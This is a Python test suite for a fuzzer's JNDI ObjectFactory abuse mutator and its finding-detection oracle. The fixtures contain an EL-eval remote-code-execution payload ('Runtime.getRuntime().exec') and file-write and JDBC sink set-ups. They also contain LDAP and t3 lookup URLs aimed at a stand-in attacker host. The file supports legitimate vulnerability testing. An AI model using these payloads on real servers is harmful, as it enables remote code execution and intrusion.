"""Tests for JNDI ObjectFactory abuse mutator and oracle."""

from __future__ import annotations

import json
import pytest
import random

from webfuzzer.fuzzer.protocols import ExecutionResult, Finding, Input, Severity


# ---------------------------------------------------------------------------
# JndiMutator tests
# ---------------------------------------------------------------------------

class TestJndiMutator:
    """Test JNDI ObjectFactory mutator strategies."""

    def _make_mutator(self, seed: int = 42):
        from webfuzzer.fuzzer.mutators.jndi_mutator import JndiMutator
        return JndiMutator(seed=seed)

    def _make_input(self, ir: dict) -> Input:
        data = json.dumps(ir, separators=(",", ":")).encode()
        return Input(data=data, metadata={})

    def _minimal_ir(self) -> dict:
        return {
            "attack_type": "jndi_factory",
            "factory_class": "org.apache.naming.factory.BeanFactory",
            "reference_class": "javax.el.ELProcessor",
            "factory_attrs": {
                "forceString": "x=eval",
                "x": "Runtime.getRuntime().exec('id')",
            },
            "sink_type": "el_eval",
            "protocol": "ldap",
            "lookup_url": "ldap://attacker.example:1389/exploit",
        }

    def _drain_probes(self, m):
        """Clear factory probe warmup queue so normal mutation runs."""
        m._factory_probe_queue.clear()

    def test_mutate_produces_valid_ir(self):
        m = self._make_mutator()
        self._drain_probes(m)
        inp = self._make_input(self._minimal_ir())
        result = m.mutate(inp, corpus=[])
        ir = json.loads(result.data)
        assert ir["attack_type"] == "jndi_factory"
        assert "factory_class" in ir
        assert "factory_attrs" in ir

    def test_mutate_from_garbage_uses_minimal_ir(self):
        m = self._make_mutator()
        self._drain_probes(m)
        inp = Input(data=b"not json", metadata={})
        result = m.mutate(inp, corpus=[])
        ir = json.loads(result.data)
        assert ir["attack_type"] == "jndi_factory"

    def test_mutate_applies_strategies(self):
        m = self._make_mutator()
        self._drain_probes(m)
        inp = self._make_input(self._minimal_ir())
        result = m.mutate(inp, corpus=[])
        assert "strategies" in result.metadata
        assert len(result.metadata["strategies"]) >= 1

    def test_factory_probe_warmup(self):
        m = self._make_mutator()
        assert len(m._factory_probe_queue) > 0, "Should have probes queued"
        inp = self._make_input(self._minimal_ir())
        result = m.mutate(inp, corpus=[])
        assert result.metadata.get("strategy") == "factory_probe"
        ir = json.loads(result.data)
        assert ir["sink_type"] == "probe"

    def test_factory_swap_changes_factory(self):
        m = self._make_mutator(seed=123)
        ir = self._minimal_ir()
        result = m._factory_swap(ir, [])
        assert result is not None
        assert result["factory_class"] != ir["factory_class"]

    def test_protocol_swap_changes_protocol(self):
        m = self._make_mutator(seed=7)
        ir = self._minimal_ir()
        result = m._protocol_swap(ir, [])
        assert result is not None
        assert result["protocol"] != ir["protocol"]
        assert result["protocol"] in ("ldap", "ldaps", "rmi", "dns", "iiop")

    def test_url_obfuscate_changes_url(self):
        # Try multiple seeds — the first template may match original
        changed = False
        for seed in range(20):
            m = self._make_mutator(seed=seed)
            ir = self._minimal_ir()
            result = m._url_obfuscate(ir, [])
            if result is not None and result["lookup_url"] != ir["lookup_url"]:
                changed = True
                break
        assert changed, "url_obfuscate should eventually produce different URL"

    def test_sink_payload_swap_changes_payload(self):
        m = self._make_mutator()
        ir = self._minimal_ir()
        # Run enough times to likely get a different payload
        changed = False
        for seed in range(50):
            m2 = self._make_mutator(seed=seed)
            result = m2._sink_payload_swap(ir, [])
            if result is not None:
                attrs = result.get("factory_attrs", {})
                if attrs.get("x") != ir["factory_attrs"]["x"]:
                    changed = True
                    break
        assert changed, "sink_payload_swap should eventually change payload"

    def test_sink_type_swap_changes_sink(self):
        m = self._make_mutator(seed=5)
        ir = self._minimal_ir()
        result = m._sink_type_swap(ir, [])
        assert result is not None
        assert result["sink_type"] != ir["sink_type"]
        # Should still be in compatible sinks for BeanFactory
        from webfuzzer.fuzzer.mutators.jndi_mutator import FACTORY_DATABASE
        bf = FACTORY_DATABASE["org.apache.naming.factory.BeanFactory"]
        assert result["sink_type"] in bf["compatible_sinks"]

    def test_jdbc_url_swap(self):
        m = self._make_mutator()
        ir = self._minimal_ir()
        result = m._jdbc_url_swap(ir, [])
        assert result is not None
        assert result["sink_type"].startswith("jdbc_")
        attrs = result.get("factory_attrs", {})
        # Should have a JDBC URL and driver
        has_url = "url" in attrs or "jdbcUrl" in attrs
        assert has_url
        assert "driverClassName" in attrs

    def test_consistency_fix_repairs_mismatched_sink(self):
        m = self._make_mutator()
        ir = self._minimal_ir()
        ir["sink_type"] = "jdbc_h2_runscript"  # Incompatible with BeanFactory
        result = m._consistency_fix(ir, [])
        assert result is not None
        from webfuzzer.fuzzer.mutators.jndi_mutator import FACTORY_DATABASE
        bf = FACTORY_DATABASE["org.apache.naming.factory.BeanFactory"]
        assert result["sink_type"] in bf["compatible_sinks"]

    def test_forcestring_mutate(self):
        m = self._make_mutator()
        ir = self._minimal_ir()
        result = m._forcestring_mutate(ir, [])
        assert result is not None
        fs = result["factory_attrs"]["forceString"]
        assert "=" in fs

    def test_feedback_adjusts_weights(self):
        m = self._make_mutator()
        initial_weight = m._weights[0]
        m.feedback(m._strategy_names[0], "finding")
        assert m._weights[0] > initial_weight

    def test_reset_weights(self):
        m = self._make_mutator()
        m.feedback(m._strategy_names[0], "finding")
        m.feedback(m._strategy_names[0], "finding")
        m.reset_weights()
        assert m._weights == m._base_weights

    def test_output_under_size_limit(self):
        m = self._make_mutator()
        inp = self._make_input(self._minimal_ir())
        for _ in range(100):
            result = m.mutate(inp, corpus=[])
            assert len(result.data) <= 16384

    def test_all_factory_classes_returns_list(self):
        m = self._make_mutator()
        factories = m._all_factory_classes()
        assert len(factories) >= 8  # at least the built-in ones
        assert "org.apache.naming.factory.BeanFactory" in factories

    def test_jdbc_param_inject(self):
        m = self._make_mutator()
        ir = self._minimal_ir()
        ir["factory_attrs"]["url"] = "jdbc:h2:mem:test"
        ir["factory_attrs"]["driverClassName"] = "org.h2.Driver"
        result = m._jdbc_param_inject(ir, [])
        assert result is not None
        url = result["factory_attrs"]["url"]
        assert len(url) > len("jdbc:h2:mem:test")

    def test_exception_guided_class_not_found(self):
        m = self._make_mutator()
        m.set_exception_hint({
            "error_type": "class_not_found",
            "error_message": "ELProcessor not found",
            "factory_class": "org.apache.naming.factory.BeanFactory",
            "reference_class": "javax.el.ELProcessor",
        })
        ir = self._minimal_ir()
        result = m._exception_guided(ir, [])
        assert result is not None
        # Should have switched away from ELProcessor (now in _unavailable_classes)
        assert result["reference_class"] != "javax.el.ELProcessor"

    def test_file_write_factory_uses_userdatabase_interface(self):
        m = self._make_mutator()
        ir = self._minimal_ir()
        m._update_attrs_for_factory(
            ir,
            "org.apache.catalina.users.MemoryUserDatabaseFactory",
            "file_write",
        )
        assert ir["reference_class"] == "org.apache.catalina.UserDatabase"
        assert ir["factory_attrs"]["readonly"] == "false"
        assert "pathname" in ir["factory_attrs"]

    def test_direct_h2_factory_uses_datasource_contract(self):
        m = self._make_mutator()
        ir = {
            "attack_type": "jndi_factory",
            "factory_class": "org.h2.jdbcx.JdbcDataSourceFactory",
            "reference_class": "java.lang.Object",
            "factory_attrs": {},
            "sink_type": "jdbc_h2_runscript",
            "protocol": "ldap",
            "lookup_url": "ldap://attacker.example:1389/exploit",
        }
        m._normalize_ir_contract(ir)
        assert ir["reference_class"] == "org.h2.jdbcx.JdbcDataSource"
        assert ir["factory_attrs"]["user"] == "sa"
        assert ir["factory_attrs"]["password"] == ""
        assert ir["factory_attrs"]["description"] == ""
        assert ir["factory_attrs"]["loginTimeout"] == "0"
        assert "url" in ir["factory_attrs"]
        assert "driverClassName" not in ir["factory_attrs"]

    def test_direct_hsqldb_factory_uses_database_contract(self):
        m = self._make_mutator()
        ir = {
            "attack_type": "jndi_factory",
            "factory_class": "org.hsqldb.jdbc.JDBCDataSourceFactory",
            "reference_class": "java.lang.Object",
            "factory_attrs": {},
            "sink_type": "jdbc_hsqldb_call",
            "protocol": "ldap",
            "lookup_url": "ldap://attacker.example:1389/exploit",
        }
        m._normalize_ir_contract(ir)
        assert ir["reference_class"] == "org.hsqldb.jdbc.JDBCDataSource"
        assert ir["factory_attrs"]["user"] == "sa"
        assert ir["factory_attrs"]["password"] == ""
        assert "database" in ir["factory_attrs"]
        assert "url" not in ir["factory_attrs"]
        assert "driverClassName" not in ir["factory_attrs"]

    def test_hikari_uses_jdbcurl_driver_contract(self):
        m = self._make_mutator()
        ir = {
            "attack_type": "jndi_factory",
            "factory_class": "com.zaxxer.hikari.HikariJNDIFactory",
            "reference_class": "java.lang.Object",
            "factory_attrs": {},
            "sink_type": "jdbc_h2_runscript",
            "protocol": "ldap",
            "lookup_url": "ldap://attacker.example:1389/exploit",
        }
        m._normalize_ir_contract(ir)
        assert ir["reference_class"] == "javax.sql.DataSource"
        assert "jdbcUrl" in ir["factory_attrs"]
        assert ir["factory_attrs"]["driverClassName"] == "org.h2.Driver"
        assert ir["factory_attrs"]["username"] == "sa"
        assert ir["factory_attrs"]["password"] == ""

    def test_weblogic_alias_contract_repairs_reference_and_attrs(self):
        m = self._make_mutator()
        ir = {
            "attack_type": "jndi_factory",
            "factory_class": "weblogic.jndi.WLInitialContextFactory",
            "reference_class": "java.lang.Object",
            "factory_attrs": {},
            "sink_type": "jndi_relookup",
            "protocol": "ldap",
            "lookup_url": "ldap://attacker.example:1389/exploit",
        }
        m._normalize_ir_contract(ir)
        assert ir["reference_class"] == "javax.naming.Context"
        assert ir["factory_attrs"]["java.naming.factory.initial"] == (
            "weblogic.jndi.WLInitialContextFactory"
        )
        assert ir["factory_attrs"]["java.naming.provider.url"].startswith("t3://")

    def test_jdbc_url_swap_preserves_direct_factory_contract(self):
        m = self._make_mutator()
        ir = {
            "attack_type": "jndi_factory",
            "factory_class": "org.hsqldb.jdbc.JDBCDataSourceFactory",
            "reference_class": "java.lang.Object",
            "factory_attrs": {},
            "sink_type": "jdbc_hsqldb_call",
            "protocol": "ldap",
            "lookup_url": "ldap://attacker.example:1389/exploit",
        }
        result = m._jdbc_url_swap(ir, [])
        assert result is not None
        assert result["reference_class"] == "org.hsqldb.jdbc.JDBCDataSource"
        assert "database" in result["factory_attrs"]
        assert "url" not in result["factory_attrs"]
        assert "driverClassName" not in result["factory_attrs"]

    def test_exception_guided_timeout_repairs_to_local_file_write(self):
        m = self._make_mutator()
        m.set_exception_hint({
            "error_type": "timeout",
            "error_message": "Persistent target read timed out after 3.0s",
        })
        ir = {
            "attack_type": "jndi_factory",
            "factory_class": "weblogic.jndi.WLInitialContextFactory",
            "reference_class": "javax.naming.Context",
            "factory_attrs": {
                "java.naming.provider.url": "t3://attacker.example:7001",
            },
            "sink_type": "jndi_relookup",
            "protocol": "ldap",
            "lookup_url": "ldap://attacker.example:1389/exploit",
        }
        result = m._exception_guided(ir, [])
        assert result is not None
        assert result["factory_class"] == "org.apache.catalina.users.MemoryUserDatabaseFactory"
        assert result["sink_type"] == "file_write"
        assert result["reference_class"] == "org.apache.catalina.UserDatabase"
        assert result["factory_attrs"]["readonly"] == "false"

    def test_timeout_feedback_penalizes_exception_guided_weight(self):
        m = self._make_mutator()
        idx = m._strategy_names.index("exception_guided")
        before = m._weights[idx]
        m.feedback("exception_guided", "timeout")
        assert m._weights[idx] < before


# ---------------------------------------------------------------------------
# JndiOracle tests
# ---------------------------------------------------------------------------

class TestJndiOracle:
    """Test JNDI ObjectFactory oracle finding detection."""

    def _make_oracle(self):
        from webfuzzer.fuzzer.oracles.jndi_oracle import JndiOracle
        return JndiOracle()

    def _make_input(self) -> Input:
        ir = {
            "attack_type": "jndi_factory",
            "factory_class": "org.apache.naming.factory.BeanFactory",
            "reference_class": "javax.el.ELProcessor",
            "factory_attrs": {"forceString": "x=eval", "x": "test"},
            "sink_type": "el_eval",
            "protocol": "ldap",
            "lookup_url": "ldap://attacker.example:1389/exploit",
        }
        return Input(data=json.dumps(ir).encode(), metadata={})

    def _make_result(self, output: dict, exit_code: int = 0) -> ExecutionResult:
        return ExecutionResult(
            stdout=json.dumps(output).encode(),
            stderr=b"",
            exit_code=exit_code,
            duration_ms=10.0,
        )

    def test_no_finding_on_no_sinks(self):
        oracle = self._make_oracle()
        result = self._make_result({
            "resolved": True,
            "factory_loaded": True,
            "factory_class": "org.apache.naming.factory.BeanFactory",
            "sinks_hit": [],
        })
        finding = oracle.check(self._make_input(), result)
        assert finding is None

    def test_critical_finding_on_cmd_exec(self):
        oracle = self._make_oracle()
        result = self._make_result({
            "resolved": True,
            "factory_loaded": True,
            "factory_class": "org.apache.naming.factory.BeanFactory",
            "reference_class": "javax.el.ELProcessor",
            "method_invoked": "eval",
            "sink_reached": "cmd_exec",
            "sinks_hit": ["cmd_exec"],
            "process_spawned": True,
        })
        finding = oracle.check(self._make_input(), result)
        assert finding is not None
        assert finding.severity == Severity.CRITICAL
        assert "cmd_exec" in finding.metadata["all_sinks"]

    def test_high_finding_on_jdbc_exec(self):
        oracle = self._make_oracle()
        result = self._make_result({
            "resolved": True,
            "factory_loaded": True,
            "factory_class": "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory",
            "reference_class": "javax.sql.DataSource",
            "jdbc_connected": True,
            "sql_executed": True,
            "sinks_hit": ["jdbc_exec"],
        })
        finding = oracle.check(self._make_input(), result)
        assert finding is not None
        assert finding.severity == Severity.HIGH

    def test_high_finding_on_file_write(self):
        oracle = self._make_oracle()
        result = self._make_result({
            "resolved": True,
            "factory_loaded": True,
            "factory_class": "org.apache.catalina.users.MemoryUserDatabaseFactory",
            "file_write": True,
            "sinks_hit": ["file_write"],
        })
        finding = oracle.check(self._make_input(), result)
        assert finding is not None
        assert finding.severity == Severity.HIGH

    def test_no_finding_on_exit_code_nonzero_no_stdout(self):
        oracle = self._make_oracle()
        result = ExecutionResult(
            stdout=b"",
            stderr=b"error",
            exit_code=1,
            duration_ms=5.0,
        )
        finding = oracle.check(self._make_input(), result)
        assert finding is None

    def test_dedup_hash_differs_for_different_factories(self):
        oracle = self._make_oracle()
        result1 = self._make_result({
            "resolved": True,
            "factory_loaded": True,
            "factory_class": "org.apache.naming.factory.BeanFactory",
            "reference_class": "javax.el.ELProcessor",
            "method_invoked": "eval",
            "sink_reached": "cmd_exec",
            "sinks_hit": ["cmd_exec"],
        })
        result2 = self._make_result({
            "resolved": True,
            "factory_loaded": True,
            "factory_class": "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory",
            "reference_class": "javax.sql.DataSource",
            "jdbc_connected": True,
            "sinks_hit": ["jdbc_exec"],
        })
        f1 = oracle.check(self._make_input(), result1)
        f2 = oracle.check(self._make_input(), result2)
        assert f1 is not None and f2 is not None
        assert f1.fingerprint != f2.fingerprint


# ---------------------------------------------------------------------------
# JndiDiffStrategy tests
# ---------------------------------------------------------------------------

class TestJndiDiffStrategy:
    """Test JNDI differential strategies."""

    def _make_input(self) -> Input:
        ir = {
            "attack_type": "jndi_factory",
            "factory_class": "org.apache.naming.factory.BeanFactory",
            "reference_class": "javax.el.ELProcessor",
        }
        return Input(data=json.dumps(ir).encode(), metadata={})

    def _make_result(self, output: dict) -> ExecutionResult:
        return ExecutionResult(
            stdout=json.dumps(output).encode(),
            stderr=b"",
            exit_code=0,
            duration_ms=10.0,
        )

    def test_factory_resolution_divergence(self):
        from webfuzzer.fuzzer.oracles.jndi_diff_strategy import (
            FactoryResolutionDivergenceStrategy,
        )
        strat = FactoryResolutionDivergenceStrategy()
        inp = self._make_input()
        primary = self._make_result({
            "factory_loaded": True,
            "factory_class": "org.apache.naming.factory.BeanFactory",
            "resolved": True,
            "sink_reached": "cmd_exec",
            "process_spawned": True,
        })
        ref = self._make_result({
            "factory_loaded": False,
            "exception_class": "ClassNotFoundException",
        })
        finding = strat.compare(inp, primary, ref, 0)
        assert finding is not None
        assert finding.severity == Severity.HIGH

    def test_sink_reach_divergence(self):
        from webfuzzer.fuzzer.oracles.jndi_diff_strategy import (
            SinkReachDivergenceStrategy,
        )
        strat = SinkReachDivergenceStrategy()
        inp = self._make_input()
        primary = self._make_result({
            "resolved": True,
            "factory_loaded": True,
            "sink_reached": "cmd_exec",
            "sinks_hit": ["cmd_exec"],
            "process_spawned": True,
        })
        ref = self._make_result({
            "resolved": True,
            "factory_loaded": True,
            "sinks_hit": [],
        })
        findings = strat.compare(inp, primary, ref, 0)
        assert findings is not None
        assert len(findings) >= 1
        assert findings[0].severity == Severity.CRITICAL

    def test_no_divergence_when_same_sinks(self):
        from webfuzzer.fuzzer.oracles.jndi_diff_strategy import (
            SinkReachDivergenceStrategy,
        )
        strat = SinkReachDivergenceStrategy()
        inp = self._make_input()
        primary = self._make_result({
            "resolved": True,
            "sinks_hit": ["cmd_exec"],
            "sink_reached": "cmd_exec",
        })
        ref = self._make_result({
            "resolved": True,
            "sinks_hit": ["cmd_exec"],
            "sink_reached": "cmd_exec",
        })
        findings = strat.compare(inp, primary, ref, 0)
        assert findings is None

    def test_jdbc_driver_divergence(self):
        from webfuzzer.fuzzer.oracles.jndi_diff_strategy import (
            JDBCDriverDivergenceStrategy,
        )
        strat = JDBCDriverDivergenceStrategy()
        inp = self._make_input()
        primary = self._make_result({
            "resolved": True,
            "jdbc_connected": True,
            "sql_executed": True,
            "jdbc_driver": "org.h2.Driver",
        })
        ref = self._make_result({
            "resolved": True,
            "jdbc_connected": False,
            "sql_executed": False,
        })
        finding = strat.compare(inp, primary, ref, 0)
        assert finding is not None
        assert finding.severity == Severity.HIGH

    def test_jdk_version_divergence(self):
        from webfuzzer.fuzzer.oracles.jndi_diff_strategy import (
            JDKVersionDivergenceStrategy,
        )
        strat = JDKVersionDivergenceStrategy()
        inp = self._make_input()
        primary = self._make_result({
            "resolved": True,
            "jdk_version": "8.0.345",
            "sink_reached": "cmd_exec",
            "process_spawned": True,
        })
        ref = self._make_result({
            "resolved": True,
            "jdk_version": "17.0.2",
        })
        finding = strat.compare(inp, primary, ref, 0)
        assert finding is not None
        assert finding.severity == Severity.HIGH

    def test_get_jndi_strategies_returns_list(self):
        from webfuzzer.fuzzer.oracles.jndi_diff_strategy import get_jndi_strategies
        strategies = get_jndi_strategies()
        assert len(strategies) >= 5  # 5 JNDI + defaults
        names = [s.name for s in strategies if hasattr(s, "name")]
        assert "jndi_sink_reach" in names
        assert "jndi_factory_resolution" in names
